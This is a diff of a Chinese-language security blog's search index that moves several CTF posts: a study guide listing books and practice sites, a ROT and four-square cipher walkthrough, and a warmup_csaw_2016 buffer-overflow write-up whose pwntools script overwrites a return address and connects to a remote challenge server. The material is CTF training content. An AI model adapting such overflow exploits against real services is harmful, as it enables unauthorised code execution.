@@ -1,6 +1,100 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF学习指南</title>
+    <url>/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[<span id="more"></span>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。</p>
+<p>crypto：偏重对数学，算法的深入学习，同时也需要对常见密码有所了解-AES/DES等；</p>
+<p>Web：需要对各种web漏洞了解，明白其形成原因和利用方式；了解计算机网络、网站搭建、会用常见的网站框架，同时需要大量的练习；</p>
+<p>Misc：则更为复杂，所有与计算机安全挑战有关的都算在其中，所学很杂，积累和刷题很重要，常见有流量分析/隐写等；</p>
+<p>Mobile:安卓逆向，要去了解安卓的基本架构；</p>
+<h2 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h2><p>　　A方向：PWN+Reverse+crypto,随机搭配；</p>
+<p>　　B方向：Web+Misc组合；</p>
+<h2 id="都要学的内容："><a href="#都要学的内容：" class="headerlink" title="都要学的内容："></a>都要学的内容：</h2><ul>
+<li>Linux基础</li>
+<li>计算机组成原理</li>
+<li>操作系统原理</li>
+<li>网络协议分析</li>
+<li>数据结构</li>
+<li>算法</li>
+</ul>
+<h2 id="A方向"><a href="#A方向" class="headerlink" title="A方向"></a>A方向</h2><p>　　　　IDA工具使用（f5插件），逆向工程，密码学，缓冲区溢出等</p>
+<p>​         书籍推荐：</p>
+<ul>
+<li><p>《加密与解密（第四版）》；</p>
+</li>
+<li><p>《IDA Pro权威指南》；</p>
+</li>
+<li><p>《逆向工程权威指南》（字典工具书）；</p>
+</li>
+<li><p>《自己动手写操作系统》；</p>
+</li>
+<li><p>《算法导论》</p>
+</li>
+<li><p>《汇编语言》</p>
+</li>
+<li><p>《黑客攻防宝典，系统实战篇》；</p>
+</li>
+<li><p>《程序员的自我修养—链接、装载与库》</p>
+<p>网站推荐： </p>
+<p>www.pediy.com</p>
+<p>www.52pojie.cn</p>
+<p>www.pwnable.kr</p>
+<p>www.pwnable.tw</p>
+</li>
+</ul>
+<h2 id="B方向"><a href="#B方向" class="headerlink" title="B方向"></a>B方向</h2><p>　　　　网络安全，内网渗透，数据库安全。</p>
+<p>　　　　书籍推荐：</p>
+<ul>
+<li><p>《Web应用安全权威指南》</p>
+</li>
+<li><p>《web前端黑客技术揭秘》</p>
+</li>
+<li><p>《黑客秘籍-渗透测试实用指南》</p>
+</li>
+<li><p>《黑客攻防技术宝典Web实战篇》</p>
+</li>
+<li><p>《代码审计：企业级Web代码安全架构》</p>
+</li>
+<li><p>《SQL注入攻击与防御》</p>
+<p>网站推荐：</p>
+<p><a href="http://www.dvwa.co.uk/">dvwa本地靶场</a>（自己在本地搭建）</p>
+<p><a href="https://github.com/Audi-1/sqli-labs">SQLilab本地靶场</a>（自己在本地搭建）</p>
+<p><a href="https://pan.baidu.com/s/1eRIB3Se">webug</a>（本地搭建）</p>
+<p><a href="http://hackinglab.cn/">http://hackinglab.cn/</a></p>
+<p><a href="http://www.gameofhacks.com/">http://www.gameofhacks.com/</a></p>
+<p><a href="http://1111.segmentfault.com/">http://1111.segmentfault.com/</a> 光棍节程序员闯关秀</p>
+<p><a href="http://monyer.com/game/game1/">http://monyer.com/game/game1/</a>梦之光芒的小游戏</p>
+<p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a> 黑客丛林之旅</p>
+<p><a href="http://hackgame.blackbap.org/">http://hackgame.blackbap.org/</a> 习科黑客游戏</p>
+<p><a href="http://www.helloisa.com/test/">http://www.helloisa.com/test/</a> ISA闯关游戏</p>
+<p><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a> 红客闯关游戏</p>
+<p><a href="http://hackit.sinaapp.com/">http://hackit.sinaapp.com/</a> hackit游戏</p>
+</li>
+</ul>
+<h2 id="CTF综合平台"><a href="#CTF综合平台" class="headerlink" title="CTF综合平台"></a>CTF综合平台</h2><p>学校自己的系统（10.222.2.235/10.222.2.236）</p>
+<p><a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋</p>
+<p><a href="http://www.shiyanbar.com">http://www.shiyanbar.com</a> 实验吧</p>
+<p><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a> bugku平台</p>
+<p><a href="http://oj.xctf.org.cn/">http://oj.xctf.org.cn/</a> XCTF_OJ练习平台 （自己去找吧）</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>　　CTF比赛一般都是使用网络完全常用工具，比如burp、IDA等，但是会与很多大家不常见的工具：</p>
+<p>　　　　<a href="https://hithub.com/truongkma/ctf-tools">https://hithub.com/truongkma/ctf-tools</a></p>
+<p>　　　　<a href="https://tool.bugku.com/">https://tool.bugku.com/</a></p>
+<h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><ul>
+<li>​        <a href="https://ctftime.org/国际比赛">https://ctftime.org/国际比赛</a></li>
+<li>​        <a href="http://www.xctf.org.cn/国内比赛">http://www.xctf.org.cn/国内比赛</a></li>
+<li>​        <a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋（赛宁）</li>
+</ul>
+<p>【注】：</p>
+<p>1、writeup指CTF比赛结题思路</p>
+<h1 id="信心比黄金更重要"><a href="#信心比黄金更重要" class="headerlink" title="信心比黄金更重要"></a><strong>信心比黄金更重要</strong></h1><p>禁止转载！！！</p>
+]]></content>
+      <tags>
+        <tag>总结</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF_Game_Challenges</title>
     <url>/2021/06/23/CTF-Game-Challenges/</url>
     <content><![CDATA[<h1 id="CTF-Game-Challenges"><a href="#CTF-Game-Challenges" class="headerlink" title="CTF Game Challenges"></a>CTF Game Challenges</h1><p>I have been learning about game hacking recently and the best way I could find legally to practice is by playing <a href="https://ctftime.org/ctf-wtf/">CTFs</a>.<br>But the difficult part is finding out the Game challenges from previous ctfs.  </p>
@@ -399,135 +493,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>CTF学习指南</title>
-    <url>/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>PWN,Reverse：偏重对汇编，逆向的理解，逆向更多要求对于各种代码的了解，会常见开发，注重算法的理解，数据结构和算法一定要学好；PWN要求对于计算机系统的了解，对于基础的数据结构-栈堆-以及Linux/widows下的程序调用比较熟悉。</p>
-<p>crypto：偏重对数学，算法的深入学习，同时也需要对常见密码有所了解-AES/DES等；</p>
-<p>Web：需要对各种web漏洞了解，明白其形成原因和利用方式；了解计算机网络、网站搭建、会用常见的网站框架，同时需要大量的练习；</p>
-<p>Misc：则更为复杂，所有与计算机安全挑战有关的都算在其中，所学很杂，积累和刷题很重要，常见有流量分析/隐写等；</p>
-<p>Mobile:安卓逆向，要去了解安卓的基本架构；</p>
-<h2 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h2><p>　　A方向：PWN+Reverse+crypto,随机搭配；</p>
-<p>　　B方向：Web+Misc组合；</p>
-<h2 id="都要学的内容："><a href="#都要学的内容：" class="headerlink" title="都要学的内容："></a>都要学的内容：</h2><ul>
-<li>Linux基础</li>
-<li>计算机组成原理</li>
-<li>操作系统原理</li>
-<li>网络协议分析</li>
-<li>数据结构</li>
-<li>算法</li>
-</ul>
-<h2 id="A方向"><a href="#A方向" class="headerlink" title="A方向"></a>A方向</h2><p>　　　　IDA工具使用（f5插件），逆向工程，密码学，缓冲区溢出等</p>
-<p>​         书籍推荐：</p>
-<ul>
-<li><p>《加密与解密（第四版）》；</p>
-</li>
-<li><p>《IDA Pro权威指南》；</p>
-</li>
-<li><p>《逆向工程权威指南》（字典工具书）；</p>
-</li>
-<li><p>《自己动手写操作系统》；</p>
-</li>
-<li><p>《算法导论》</p>
-</li>
-<li><p>《汇编语言》</p>
-</li>
-<li><p>《黑客攻防宝典，系统实战篇》；</p>
-</li>
-<li><p>《程序员的自我修养—链接、装载与库》</p>
-<p>网站推荐： </p>
-<p>www.pediy.com</p>
-<p>www.52pojie.cn</p>
-<p>www.pwnable.kr</p>
-<p>www.pwnable.tw</p>
-</li>
-</ul>
-<h2 id="B方向"><a href="#B方向" class="headerlink" title="B方向"></a>B方向</h2><p>　　　　网络安全，内网渗透，数据库安全。</p>
-<p>　　　　书籍推荐：</p>
-<ul>
-<li><p>《Web应用安全权威指南》</p>
-</li>
-<li><p>《web前端黑客技术揭秘》</p>
-</li>
-<li><p>《黑客秘籍-渗透测试实用指南》</p>
-</li>
-<li><p>《黑客攻防技术宝典Web实战篇》</p>
-</li>
-<li><p>《代码审计：企业级Web代码安全架构》</p>
-</li>
-<li><p>《SQL注入攻击与防御》</p>
-<p>网站推荐：</p>
-<p><a href="http://www.dvwa.co.uk/">dvwa本地靶场</a>（自己在本地搭建）</p>
-<p><a href="https://github.com/Audi-1/sqli-labs">SQLilab本地靶场</a>（自己在本地搭建）</p>
-<p><a href="https://pan.baidu.com/s/1eRIB3Se">webug</a>（本地搭建）</p>
-<p><a href="http://hackinglab.cn/">http://hackinglab.cn/</a></p>
-<p><a href="http://www.gameofhacks.com/">http://www.gameofhacks.com/</a></p>
-<p><a href="http://1111.segmentfault.com/">http://1111.segmentfault.com/</a> 光棍节程序员闯关秀</p>
-<p><a href="http://monyer.com/game/game1/">http://monyer.com/game/game1/</a>梦之光芒的小游戏</p>
-<p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a> 黑客丛林之旅</p>
-<p><a href="http://hackgame.blackbap.org/">http://hackgame.blackbap.org/</a> 习科黑客游戏</p>
-<p><a href="http://www.helloisa.com/test/">http://www.helloisa.com/test/</a> ISA闯关游戏</p>
-<p><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a> 红客闯关游戏</p>
-<p><a href="http://hackit.sinaapp.com/">http://hackit.sinaapp.com/</a> hackit游戏</p>
-</li>
-</ul>
-<h2 id="CTF综合平台"><a href="#CTF综合平台" class="headerlink" title="CTF综合平台"></a>CTF综合平台</h2><p>学校自己的系统（10.222.2.235/10.222.2.236）</p>
-<p><a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋</p>
-<p><a href="http://www.shiyanbar.com">http://www.shiyanbar.com</a> 实验吧</p>
-<p><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a> bugku平台</p>
-<p><a href="http://oj.xctf.org.cn/">http://oj.xctf.org.cn/</a> XCTF_OJ练习平台 （自己去找吧）</p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>　　CTF比赛一般都是使用网络完全常用工具，比如burp、IDA等，但是会与很多大家不常见的工具：</p>
-<p>　　　　<a href="https://hithub.com/truongkma/ctf-tools">https://hithub.com/truongkma/ctf-tools</a></p>
-<p>　　　　<a href="https://tool.bugku.com/">https://tool.bugku.com/</a></p>
-<h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><ul>
-<li>​        <a href="https://ctftime.org/国际比赛">https://ctftime.org/国际比赛</a></li>
-<li>​        <a href="http://www.xctf.org.cn/国内比赛">http://www.xctf.org.cn/国内比赛</a></li>
-<li>​        <a href="http://www.ichunqiu.com/">http://www.ichunqiu.com/</a>  i春秋（赛宁）</li>
-</ul>
-<p>【注】：</p>
-<p>1、writeup指CTF比赛结题思路</p>
-<h1 id="信心比黄金更重要"><a href="#信心比黄金更重要" class="headerlink" title="信心比黄金更重要"></a><strong>信心比黄金更重要</strong></h1><p>禁止转载！！！</p>
-]]></content>
-      <tags>
-        <tag>总结</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF学习记录</title>
-    <url>/2020/03/12/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h2><h3 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h3><p>题目链接：<a href="https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M">点击获取</a></p>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，需要了解什么是ROT。ROT是一种简单的替换算法，这种算法的主要加密方法是将所有明文密码同时左移或者右移某一长度，常见的是ROT13。ROT可以在二十六个字母之间替换，也可以在所有可见字符替换，如果没有指明是什么替换的话，全部试一遍也许是个不错的选择，运算量也不大。恺撒加密可以是为ROT的一种。</p>
-<h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">83</span>, <span class="number">89</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">45</span>, <span class="number">86</span>, <span class="number">96</span>, <span class="number">45</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">136</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">108</span>, <span class="number">128</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">123</span>,</span><br><span class="line">          <span class="number">111</span>, <span class="number">110</span>, <span class="number">127</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">108</span>, <span class="number">118</span>, <span class="number">128</span>, <span class="number">108</span>, <span class="number">131</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">76</span>,</span><br><span class="line">          <span class="number">76</span>, <span class="number">76</span>, <span class="number">76</span>, <span class="number">138</span>, <span class="number">23</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">65</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">70</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">69</span>,</span><br><span class="line">          <span class="number">67</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">61</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line">    <span class="comment"># print hashlib.md5(flag).hexdigest()</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                    <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(hashlib.md5(flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(</span><br><span class="line">                            d) + <span class="string">&quot;&#125;&quot;</span>).hexdigest()) == <span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i - j)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    check()</span><br></pre></td></tr></table></figure>
-<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>本来以为flag后面都是小写字母，所以一开始只跑了小写字母，跑了半天跑不出来，扩大范围后成功搞定：</p>
-<p><a href=""><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312152838QQ%E6%88%AA%E5%9B%BE20200312232030.png" alt="img"></a></p>
-<h3 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h3><p>题目链接：<a href="https://buuoj.cn/files/adf09f561e314b56e65728810c377035/7ce788ae-4e7e-4c30-b9b9-c558ad94f7c5.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE4MH0.XmpVkw.BOqIrh67tkpxMQfO6eSXFRtCbwM">点击获取</a></p>
-<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>来自题目的提示，四面八方，提示四方密码。<strong>四方密码</strong>是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。 这种方法将字母两个一组，然后采用多字母替换密码。首先选择两个英文字作密匙，例如example和keyword。对于每一个密匙，将重复出现的字母去除，即example要转成exampl，然后将每个字母顺序放入矩阵，再将余下的字母顺序放入矩阵，便得出加密矩阵。<br>将这两个加密矩阵放在右上角和左下角，余下的两个角放a到z顺序的矩阵：<br>加密的步骤：</p>
-<ol>
-<li>两个字母一组地分开讯息：（例如hello world变成he ll ow or ld）；</li>
-<li>找出第一个字母在左上角矩阵的位置；</li>
-<li>同样道理，找第二个字母在右下角矩阵的位置；</li>
-<li>找右上角矩阵中，和第一个字母同行，第二个字母同列的字母；</li>
-<li>找左下角矩阵中，和第一个字母同列，第二个字母同行的字母；</li>
-<li>得到的这两个字母就是加密过的讯息。</li>
-<li>he lp me ob iw an ke no bi的加密结果：FY NF NE HW BX AF FO KH MD</li>
-</ol>
-<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_20031215365014902656863653.jpg!33.jpg" alt=""></p>
-<h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p>自己动手画</p>
-<h2 id="0x02-PWN"><a href="#0x02-PWN" class="headerlink" title="0x02 PWN"></a>0x02 PWN</h2><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>题目链接：<a href="https://buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5MH0.XmpYGw.FeTRtFI215Vnv-BJFYhg9Jlhp5g">点击获取</a></p>
-<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>IDA打开之后，可以看到：</p>
-<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155055QQ%E6%88%AA%E5%9B%BE20200312235011.png" alt=""></p>
-<p>可以看到危险函数gets，常见的危险函数还有strcpy，strcat，sprintf。这些函数可以造成缓冲区溢出。简单的说，我们需要用数据填充缓冲区，覆盖返回地址，这样我们就可以控制代码执行。在这个程序中，存在一个构造好的函数，用于读取flag。</p>
-<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155906QQ%E6%88%AA%E5%9B%BE20200312235828.png" alt=""></p>
-<p>这个地址也被输给我们了，所以我们只要确定到底要覆盖多长就行了。开启pwn-dbg调试。</p>
-<p>我们可以用python的pwn模块下的cyclic函数构造一个比较长的字符串并输入，可以发现：</p>
-<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png" alt=""></p>
-<p>可以发现长度为72</p>
-<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png" alt=""></p>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="comment">#p = pwn.process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">p = pwn.remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26272</span>)</span><br><span class="line">elf = pwn.ELF(<span class="string">&#x27;./warmup_csaw_2016&#x27;</span>)</span><br><span class="line">assdr = <span class="number">0x40060d</span></span><br><span class="line">pwn.context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">pwn.context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>+pwn.p64(assdr)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-]]></content>
-  </entry>
-  <entry>
     <title>Dina渗透</title>
     <url>/2018/12/08/Dina%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。<br><span id="more"></span></p>
@@ -573,30 +538,38 @@
       </tags>
   </entry>
   <entry>
-    <title>[PWNABLE.kr]uaf</title>
-    <url>/2020/06/14/PWNABLE-kr-uaf/</url>
+    <title>CTF学习记录</title>
+    <url>/2020/03/12/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<span id="more"></span>
-<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
-<li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p>
-</li>
-<li><p>使用方式</p>
-<ul>
-<li>构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li>构造数据填充被释放的内存区域<ul>
-<li>再次调用该指针</li>
-</ul>
-</li>
-</ul>
+<h2 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h2><h3 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h3><p>题目链接：<a href="https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M">点击获取</a></p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，需要了解什么是ROT。ROT是一种简单的替换算法，这种算法的主要加密方法是将所有明文密码同时左移或者右移某一长度，常见的是ROT13。ROT可以在二十六个字母之间替换，也可以在所有可见字符替换，如果没有指明是什么替换的话，全部试一遍也许是个不错的选择，运算量也不大。恺撒加密可以是为ROT的一种。</p>
+<h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">83</span>, <span class="number">89</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">45</span>, <span class="number">86</span>, <span class="number">96</span>, <span class="number">45</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">136</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">108</span>, <span class="number">128</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">123</span>,</span><br><span class="line">          <span class="number">111</span>, <span class="number">110</span>, <span class="number">127</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">108</span>, <span class="number">118</span>, <span class="number">128</span>, <span class="number">108</span>, <span class="number">131</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">76</span>,</span><br><span class="line">          <span class="number">76</span>, <span class="number">76</span>, <span class="number">76</span>, <span class="number">138</span>, <span class="number">23</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">65</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">70</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">69</span>,</span><br><span class="line">          <span class="number">67</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">61</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line">    <span class="comment"># print hashlib.md5(flag).hexdigest()</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                    <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(hashlib.md5(flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(</span><br><span class="line">                            d) + <span class="string">&quot;&#125;&quot;</span>).hexdigest()) == <span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i - j)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    check()</span><br></pre></td></tr></table></figure>
+<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>本来以为flag后面都是小写字母，所以一开始只跑了小写字母，跑了半天跑不出来，扩大范围后成功搞定：</p>
+<p><a href=""><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312152838QQ%E6%88%AA%E5%9B%BE20200312232030.png" alt="img"></a></p>
